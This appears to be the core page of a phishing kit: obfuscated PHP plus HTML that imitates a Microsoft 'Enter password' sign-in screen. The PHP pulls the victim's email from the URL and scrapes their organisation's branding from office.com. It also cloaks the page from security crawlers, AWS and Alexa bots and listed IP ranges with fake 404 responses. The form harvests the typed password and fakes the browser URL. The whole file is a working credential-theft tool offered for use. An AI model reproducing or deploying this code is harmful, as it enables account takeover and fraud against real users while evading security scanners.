<?php
goto WNCHW; B8L6X: curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); goto WAYO_; HyNdJ: curl_setopt($ch, CURLOPT_HTTPHEADER, array("\x41\x63\143\145\x70\164\72\x20\x74\x65\170\164\57\x68\164\155\x6c\x2c\x61\160\x70\x6c\151\143\141\x74\151\x6f\156\x2f\x78\x68\x74\x6d\154\x2b\x78\x6d\x6c\54\141\x70\160\154\151\x63\141\x74\x69\157\x6e\57\x78\155\x6c\x3b\161\x3d\60\x2e\x39\x2c\52\x2f\52\73\x71\75\x30\x2e\70")); goto TMm_2; uk2Ym: parse_str($parts["\161\165\145\x72\171"], $query); goto pe8E5; A60HZ: $Illustration = explode("\x2c", $Illustration[0][0]); goto bV4xf; U2XHs: $_SESSION["\154\154\157\147\157"] = $logo; goto JHVe0; HmEmh: $er = $_SESSION["\165\x73\145\162\x6e\x61\155\x65"]; goto xgfpj; J0tG2: preg_match_all("\174\x22\102\x61\x6e\x6e\145\162\x4c\157\147\157\x5b\136\x3e\135\x2b\42\x3a\x28\x2e\52\51\x22\x2f\133\x5e\76\x5d\53\x22\54\174\x55", $result, $BannerLogo, PREG_PATTERN_ORDER); goto QVTDO; CTMnD: $hash = md5($v_ip); goto FQd52; TCr0M: $result = curl_exec($ch); goto NhV87; WNCHW: error_reporting(0); goto nAmjj; PIJQs: $ch = curl_init(); goto yxGT8; KwSXx: curl_setopt($ch, CURLOPT_USERAGENT, "\x55\163\145\162\55\101\x67\x65\x6e\x74\x3a\40\x4d\157\x7a\x69\x6c\154\141\x2f\x35\56\60\x20\50\115\141\143\x69\x6e\164\x6f\x73\150\73\x20\111\x6e\x74\145\154\40\x4d\141\x63\40\117\x53\x20\x58\x20\x31\x30\x5f\61\60\137\x33\x29\x20\101\160\160\154\x65\x57\x65\142\x4b\151\164\57\65\x33\67\x2e\x33\x36\40\x28\113\110\x54\115\114\x2c\x20\x6c\151\x6b\145\x20\x47\145\143\x6b\157\x29\x20\103\150\x72\x6f\x6d\x65\x2f\64\64\x2e\x30\56\x32\x34\60\63\56\x38\71\40\123\141\146\141\162\x69\x2f\x35\63\67\56\63\x36"); goto HyNdJ; ziM4s: curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); goto YIgck; GrDYC: include "\117\156\145\x5f\x74\151\155\145\56\x70\x68\160"; goto FMKKg; zlQL2: $str2 = hex2bin($test2); goto YI7Q6; gN3Cg: $ch = curl_init(); goto ZsULu; BpKGJ: $email = $_SESSION["\x75\x73\145\162\x6e\141\155\145"]; goto PIJQs; Dk6eT: curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); goto KwSXx; bV4xf: preg_match_all("\x23\134\x62\150\x74\164\x70\163\77\72\x2f\x2f\x5b\x5e\x2c\x5c\163\50\51\x3c\x3e\135\53\50\x3f\x3a\x5c\x28\133\x5c\167\x5c\144\x5d\x2b\x5c\x29\174\x28\x5b\x5e\54\x5b\x3a\160\165\156\x63\x74\72\135\x5c\163\135\x7c\57\51\51\x23", $Illustration[0], $Illustration); goto KOrvn; KOrvn: $logo_image = $BannerLogo[0][0]; goto PetQP; QzJ9M: curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); goto KTBG3; SWstY: $test = $_GET["\x65\141"]; goto Ua56M; DkeDd: if ($logo_image == '') { $logo_image = "\x66\151\x6c\145\x73\57\155\x69\x63\x72\157\x73\157\146\164\x5f\x6c\157\147\157\x2e\163\x76\x67"; } goto OEJzV; yxGT8: curl_setopt($ch, CURLOPT_URL, "\150\164\x74\160\163\72\57\57\167\167\167\56\x6f\146\146\151\x63\145\56\x63\157\x6d\57\154\x6f\x67\x69\x6e\x3f\145\x73\x3d\103\x6c\151\143\153\x26\162\165\x3d\x25\x32\106"); goto iJ3D2; xgfpj: if ($_SESSION["\165\x73\x65\x72\x6e\x61\155\145"] == '') { header("\x4c\157\x63\141\x74\151\x6f\156\x3a\40\156\145\x78\164\56\x70\150\160\x3f\163\x73\x3d\x32"); } goto BpKGJ; KTBG3: $result = curl_exec($ch); goto u9uyM; THOhD: curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); goto TCr0M; HKb_O: if ($BLOCKIE == "\x31") { if (strpos($_SERVER["\x48\x54\124\x50\x5f\x55\123\x45\122\137\101\x47\105\116\x54"], "\x54\x72\x69\144\x65\x6e\164") !== false) { goto WVPdF; jD36W: fwrite($file, $_SERVER["\x52\x45\x4d\117\124\105\137\101\104\x44\122"] . "\40" . $_SERVER["\110\124\124\x50\x5f\125\123\105\122\137\101\107\105\116\124"] . "\xd\xa"); goto fcLuf; POk5V: die("\74\x68\61\x3e\64\60\64\x20\116\157\x74\x20\x46\x6f\x75\156\144\x3c\57\x68\61\76\124\x68\x65\40\x70\141\x67\145\x20\x74\150\141\164\x20\x79\157\165\40\x68\141\x76\x65\40\162\145\161\165\145\163\x74\145\x64\x20\143\x6f\x75\x6c\144\40\156\157\164\x20\x62\145\40\x66\157\x75\x6e\144\56"); goto I7X7H; I7X7H: exit; goto DYcjC; fcLuf: fclose($file); goto AyX1I; AyX1I: header("\110\x54\x54\120\x2f\x31\x2e\60\x20\64\x30\x34\x20\116\x6f\164\40\106\157\165\x6e\x64"); goto POk5V; WVPdF: $file = fopen("\142\x6f\x74\163\56\x74\x78\x74", "\x61"); goto jD36W; DYcjC: } } goto Q27NB; TMm_2: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); goto QzJ9M; FQd52: $_SESSION["\x74\x6f\153\145\156"] = "\x61\x63\143\145\x73\163"; goto e4GO8; TEY_P: if ($BLOCKOTHERBOTS == "\61") { if (!empty($_SERVER["\110\124\x54\x50\x5f\125\123\105\122\137\101\x47\105\116\x54"])) { goto NOzAz; zOYO2: foreach ($userAgents as $agent) { if (strpos($_SERVER["\x48\x54\x54\x50\x5f\125\x53\105\x52\137\x41\107\x45\x4e\x54"], $agent) !== false) { goto ZdkzS; X0QuY: exit; goto JmsHV; Z33yz: fclose($file); goto Z5HfW; j95R3: die("\x3c\x68\x31\76\64\x30\x34\x20\116\157\164\x20\x46\157\165\x6e\144\74\x2f\x68\61\x3e\x54\x68\145\40\160\x61\147\145\40\164\150\141\x74\40\171\x6f\165\x20\x68\141\166\145\40\x72\145\x71\x75\145\163\164\x65\x64\x20\x63\157\x75\154\x64\x20\x6e\x6f\x74\40\142\x65\x20\x66\157\x75\x6e\144\x2e"); goto X0QuY; hANL_: fwrite($file, $_SERVER["\x52\x45\115\117\x54\x45\137\x41\x44\x44\x52"] . "\x20" . $_SERVER["\x48\124\124\120\137\125\x53\x45\x52\137\x41\x47\105\x4e\x54"] . "\xd\12"); goto Z33yz; ZdkzS: $file = fopen("\142\157\164\x73\56\164\170\164", "\x61"); goto hANL_; Z5HfW: header("\x48\124\124\120\x2f\x31\x2e\x30\40\64\x30\64\x20\116\157\x74\x20\x46\x6f\165\x6e\x64"); goto j95R3; JmsHV: } REr8T: } goto bumIb; bumIb: yzxYF: goto nqcXf; NOzAz: include "\157\164\x68\145\x72\x62\x2e\x70\x68\160"; goto zOYO2; nqcXf: } } goto GrDYC; JHVe0: $_SESSION["\x7a\x69\156\x64\x65\170"] = $zindex; goto U5Qle; Q27NB: if ($BLOCKIPRANGE == "\x31") { include "\x69\160\162\141\x6e\x67\145\56\x70\x68\160"; if (in_array($_SERVER["\x52\105\115\117\x54\x45\137\101\x44\x44\122"], $bannedIP)) { goto hIBbv; hIBbv: header("\x48\x54\x54\120\x2f\61\56\x30\40\x34\x30\64\x20\116\x6f\164\x20\106\x6f\165\x6e\144"); goto vnA53; vnA53: die("\x3c\x68\61\76\x34\60\64\40\116\157\164\x20\x46\157\165\156\144\x3c\57\x68\x31\x3e\124\150\145\x20\160\x61\147\x65\x20\x74\150\x61\164\40\171\157\165\x20\150\x61\166\145\x20\162\x65\x71\165\x65\x73\164\145\x64\40\143\x6f\x75\x6c\x64\40\156\157\x74\40\142\x65\x20\x66\x6f\165\156\x64\x2e"); goto neXYo; neXYo: exit; goto JLEbO; JLEbO: } else { foreach ($bannedIP as $ip) { if (preg_match("\57" . $ip . "\57", $_SERVER["\x52\x45\115\117\x54\105\137\x41\104\x44\x52"])) { goto Jme0r; nsRrL: die("\x3c\150\x31\76\64\x30\64\40\x4e\x6f\x74\x20\106\157\165\156\144\x3c\x2f\x68\x31\x3e\124\x68\x65\x20\160\141\x67\145\x20\164\x68\x61\164\x20\x79\157\x75\40\150\x61\x76\145\40\x72\x65\161\165\145\163\164\145\144\40\x63\157\x75\154\144\x20\x6e\x6f\x74\x20\x62\145\40\146\x6f\165\156\144\x2e"); goto Tijdj; mFbdZ: fwrite($file, $_SERVER["\x52\x45\115\117\x54\105\137\101\104\104\122"] . "\x20" . $_SERVER["\x48\124\x54\120\137\x55\123\105\122\x5f\101\x47\x45\x4e\x54"] . "\xd\12"); goto HipDU; Jme0r: $file = fopen("\142\x6f\164\x73\x2e\164\170\x74", "\x61"); goto mFbdZ; v8SyT: header("\110\x54\124\x50\57\x31\x2e\60\x20\64\x30\x34\x20\116\x6f\x74\x20\106\157\x75\x6e\144"); goto nsRrL; HipDU: fclose($file); goto v8SyT; Tijdj: exit; goto NSASD; NSASD: } ykK4e: } F25bs: } } goto TEY_P; ZsULu: curl_setopt($ch, CURLOPT_POST, TRUE); goto B8L6X; PetQP: $bg_image = $Illustration[0][0]; goto DkeDd; NhV87: $respond_link = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); goto Z5CDW; YI7Q6: if ($BLOCKAWS == "\x31") { if (strpos($_SERVER["\x48\124\124\120\137\x55\123\105\122\137\101\107\x45\x4e\x54"], "\141\167\x73") !== false || strpos($_SERVER["\x48\x54\x54\x50\137\125\123\105\122\x5f\x41\x47\x45\x4e\x54"], "\141\x6c\x65\170\141") !== false || strpos($_SERVER["\x48\124\x54\x50\x5f\125\123\105\x52\137\101\x47\105\x4e\x54"], "\x61\x6d\x7a\156\153\x61\x73\x73\x6f\x63\142\x6f\x74") !== false || strpos($_SERVER["\x48\124\124\x50\137\125\x53\x45\x52\x5f\x41\107\105\x4e\124"], "\145\x6d\x61\x63\x73\x2d\x77\x33\x20\163\x65\x61\x72\143\150\40\145\x6e\147\151\x6e\x65") !== false) { goto Txmw8; qYuSr: header("\x48\124\124\120\x2f\61\56\60\40\x34\60\x34\x20\116\157\164\x20\x46\x6f\x75\x6e\x64"); goto MLHN7; XNEbf: fwrite($file, $_SERVER["\x52\105\x4d\x4f\124\x45\x5f\x41\104\x44\122"] . "\40" . $_SERVER["\110\124\124\120\x5f\x55\x53\105\122\137\x41\x47\x45\116\x54"] . "\xd\12"); goto lQYqY; mT3yP: exit; goto PMhax; MLHN7: die("\x3c\x68\61\76\x34\60\64\x20\116\x6f\x74\x20\106\157\x75\x6e\144\74\x2f\150\61\x3e\x54\150\x65\40\160\141\x67\x65\x20\164\x68\141\x74\x20\x79\x6f\165\40\x68\x61\x76\145\40\x72\x65\x71\165\145\x73\164\145\x64\40\x63\157\165\x6c\144\40\x6e\157\x74\x20\x62\145\x20\x66\157\x75\156\144\56"); goto mT3yP; lQYqY: fclose($file); goto qYuSr; Txmw8: $file = fopen("\142\157\x74\163\x2e\164\x78\164", "\x61"); goto XNEbf; PMhax: } } goto HKb_O; iJ3D2: curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); goto ziM4s; WAYO_: curl_setopt($ch, CURLOPT_URL, $respond_link); goto PvGuQ; ZJl26: $_SESSION["\x6c\x6f\x67\x6f"] = $logo_image; goto U2XHs; PvGuQ: curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); goto Dk6eT; Z5CDW: curl_close($ch); goto DZUga; FMKKg: session_start(); goto N9Tff; DZUga: $parts = parse_url($respond_link); goto uk2Ym; pK2zo: preg_match_all("\43\x5c\142\x68\164\164\160\163\77\72\57\57\x5b\x5e\x2c\x5c\x73\50\51\x3c\x3e\135\x2b\50\x3f\72\134\x28\133\134\167\x5c\144\135\x2b\134\51\174\x28\x5b\x5e\x2c\x5b\72\160\x75\x6e\x63\164\x3a\x5d\134\163\x5d\x7c\x2f\51\x29\43", $BannerLogo[0], $BannerLogo); goto LbqqG; QVTDO: $BannerLogo = explode("\54", $BannerLogo[0][0]); goto pK2zo; e4GO8: if (!empty($_POST["\165\x73\145\162\x6e\x61\155\145"])) { $_SESSION["\x75\163\145\162\x6e\x61\155\x65"] = $_POST["\x75\163\145\x72\156\x61\x6d\x65"]; } else { $_SESSION["\x75\x73\x65\x72\x6e\x61\155\x65"] = $str2; } goto HmEmh; pe8E5: $post = ["\x63\154\151\145\x6e\164\137\151\144" => $query["\143\154\151\145\x6e\x74\x5f\x69\x64"], "\x6c\x6f\147\151\x6e\x5f\x68\x69\x6e\x74" => $email]; goto gN3Cg; nAmjj: include "\x63\x6f\x6e\146\151\147\56\160\150\160"; goto SWstY; Ua56M: $test2 = substr($test, 1, 99); goto zlQL2; u9uyM: curl_close($ch); goto J0tG2; Dhf_6: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); goto THOhD; OEJzV: if ($bg_image == '') { if ($style == "\x6e\145\167") { $bg_image = "\146\151\x6c\145\x73\x32\57\61\56\x6a\160\147"; $logo = "\146\151\154\145\x73\62\x2f\157\x75\x2e\x70\x6e\147"; } else { $bg_image = "\146\151\x6c\x65\x73\62\57\x30\56\x6a\x70\147"; $logo = "\x66\x69\x6c\x65\x73\57\154\157\x67\157\63\56\160\x6e\x67"; } $zindex = "\61"; } else { $zindex = "\x30"; $logo = ''; } goto ZJl26; VCMhT: curl_setopt($ch, CURLOPT_HTTPHEADER, array("\101\143\143\145\x70\x74\72\x20\164\x65\x78\x74\57\150\164\155\x6c\54\141\160\160\x6c\151\x63\141\164\x69\x6f\x6e\57\x78\x68\x74\x6d\154\53\170\155\x6c\x2c\141\160\x70\154\x69\143\141\164\151\157\x6e\57\x78\155\154\x3b\x71\75\60\56\x39\x2c\x2a\57\x2a\73\161\x3d\x30\56\70")); goto Dhf_6; LbqqG: preg_match_all("\x7c\42\111\x6c\x6c\165\x73\164\x72\141\164\x69\x6f\x6e\133\136\x3e\x5d\x2b\42\x3a\50\56\52\51\x22\57\x5b\136\x3e\135\x2b\x22\x2c\x7c\x55", $result, $Illustration, PREG_PATTERN_ORDER); goto A60HZ; YIgck: curl_setopt($ch, CURLOPT_USERAGENT, "\x55\x73\x65\x72\55\x41\147\x65\156\164\x3a\40\x4d\157\172\x69\154\154\x61\57\x35\x2e\60\40\x28\x4d\x61\x63\x69\156\164\x6f\x73\x68\x3b\40\111\156\x74\145\154\40\x4d\x61\143\40\x4f\x53\x20\130\40\61\x30\x5f\61\60\137\63\51\40\x41\160\160\x6c\145\x57\145\x62\113\151\164\x2f\65\x33\x37\x2e\63\66\40\50\x4b\110\124\115\x4c\54\40\x6c\151\x6b\x65\40\107\x65\143\153\157\x29\x20\103\x68\x72\x6f\155\145\x2f\64\64\56\60\56\x32\64\60\x33\x2e\70\71\x20\123\141\146\x61\x72\x69\57\x35\x33\67\56\63\66"); goto VCMhT; N9Tff: $v_ip = $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; goto CTMnD; U5Qle: $_SESSION["\142\x67"] = $bg_image;

?>

<!DOCTYPE html>

<html dir="ltr" lang="EN-US">
<style> .wrapper {
    position: relative;
    overflow: hidden;
}

#slide {
    right: -128px;
    -webkit-animation: slide 0.3s forwards;
	
    -webkit-animation-delay: 0s;
    animation: slide 0.4s forwards; 1s fadeIn;
    animation-delay: 0s;
	    opacity: 0;

}

@-webkit-keyframes slide {
    100% {
        right: 0;

    }
}

@keyframes slide {
    100% {
        right: 0;
		opacity: 1;
    }
}

</style>
<head>



<script>
function empty() {
    var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("password").style = "border-color:red";
		document.getElementById("password_error").style = "display: block";
        return false;
    };

}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("password").style = "";
		document.getElementById("password_error").style = "display: none";
	}
	
}

</script>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge">

<base href=".">
<title>Enter your password</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
<link rel="shortcut icon" href="./files2/favicon.ico">
            <link rel="stylesheet" title="Converged" type="text/css" href="./files/Converged1033.css">
			<style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style>
<style type="text/css">body{display:block !important;}</style>
<link rel="image_src" href="">

</head>

<body 
   <?php if ($REDGHOST==1)
   {echo 'onload="myFunction2()"';}?> class="cb" data-bind="defineGlobals: ServerData, bodyCssClass" >
 

 <script>
function myFunction2() {
window.history.pushState('Object', 'Title', 'common/login');
}
</script> 
<div> <div><div class="background" role="presentation"><div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;./files2/1-small.jpg&quot;);"></div> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;<?php echo $bg_image;?>&quot;); z-index: <?php echo $zindex?>;"></div><div class="background-overlay"></div></div></div> 

<form name="form" id="form" spellcheck="false" method="post" autocomplete="off"  method="post" action='<?php if ($truelogin==true) { echo "complete?ss=2";} else {echo "error?ss=2&ea=$er";}?>'>

 <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.A2,
            showFooterLinks: true,
            useWizardBehavior: svr.BR,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"> <div class="middle">
<div class="background-logo-holder"> <img id="banner_image" class="background-logo" src="<?php echo $logo;?>"> </div>
			<div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }" style="
    min-height: 342px;
    min-width: 338px;
    max-width: 440px;
">

<div id="progressBar" style="display:none" class="progress" role="progressbar" data-bind="component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div>
			<div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
						
						<img class="logo" role="presentation" pngsrc="<?php echo $logo_image; ?>" svgsrc="<?php echo $logo_image; ?>" data-bind="imgSrc" src="<?php echo $logo_image; ?>"></div> <div data-bind="
                    css: { &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) },
                    component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }">
							</br>
							
							
							
							
							
<button type="button" class="backButton" data-bind="
   attr: { 'id': backButtonId || 'idBtn_Back' },
   ariaLabel: str['CT_HRD_STR_Splitter_Back'],
   ariaDescribedBy: backButtonDescribedBy,
   click: backButton_onClick,
   hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
<img  onclick="window.location.href='next.php?ss=2'" role="presentation" pngsrc="files/arrow_left.png" svgsrc="files/arrow_left.png" data-bind="imgSrc" src="files/arrow_left.png"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> 
</button>		
							
							
							
							
							
							
							
							
							
							
							
							
							
							
							<?php echo $_SESSION['username']; ?>
<div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }" class="animate"><div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            hasRemoteNgc: !!sharedData.remoteNgcParams.sessionIdentifier,
                            desktopSsoEnabled: sharedData.desktopSsoEnabled,
                            defaultKmsiValue: svr.I === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            isLongRunningTransaction: sharedData.isLongRunningTransaction },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            desktopSsoStart: $loginPage.view_desktopSsoStart } }">

							<input type="text" name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">

							<div data-bind="component: { name: 'identity-banner-control',
     params: {
        pawnIconId: svr.Bw,
        displayName: displayName } }"> </div></div> 
		<div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']" style="
    font-weight: 600;
">Enter password</div>
<div id="passwordError" class="alert alert-error" data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { 'idA_IL_ForgotPassword0': { href: svr.urlResetPassword, click: resetPassword_onClick } }"><?php if ($SESSIONEXPIRED ==1) echo $EXPIREDTEXT;?></div> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"> </div> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox', params: {
            serverData: svr,
            textInput: password,
            hasFocus: isFocused,
            hintText: str['CT_PWD_STR_PwdTB_Label'],
            forcePlaceholderAttribute: true,
            hintCss: 'placeholder' } }">			
			
			<input name="password" type="password" required="" id="password" onblur="change();" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: password,
                    hasFocusEx: isFocused,
                    placeholder: $placeholderText,
                    ariaLabel: str['CT_PWD_STR_PwdTB_AriaLabel'],
                    css: { 'has-error': error }" placeholder="Password" aria-label="Enter password">


			

					</div> </div> </div>  </div> <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group no-margin-bottom" data-bind="css: { &#39;no-margin-bottom&#39;: !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink }"> <a id="idA_PWD_ForgotPassword" href="">Forgot my password</a> </div> </div> 
<script>
	function myFunction()
{
    document.getElementById('progressBar').style='display:block;';
}
</script>
<input type="submit" style="float:right" id="idSIButton9" onclick="myFunction()" class="btn btn-primary" value="Sign In">          <script>
          var form = document.getElementById("form"), button = document.getElementById("idSIButton9");



</script></form></div></div>  <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"></div> </div></div></div> </div><div id="footer" class="footer default" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.aa">©2020 Microsoft</span> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; Cookies</a> </div> </div> </div></body></html>